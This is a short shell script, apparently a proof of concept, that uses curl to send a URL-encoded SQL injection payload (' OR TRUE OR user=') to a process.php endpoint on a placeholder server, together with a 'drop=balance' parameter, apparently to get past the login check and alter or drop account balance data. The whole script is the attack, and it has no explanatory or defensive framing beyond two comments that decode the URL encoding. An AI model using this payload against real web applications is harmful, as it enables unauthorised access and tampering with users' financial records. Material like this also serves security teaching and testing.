#!/bin/sh

#%27 is '
#%3D is =

curl -o - "http://server/process.php?user=%27+OR+TRUE+OR+user%3D%27&pass=&amount=&drop=balance"
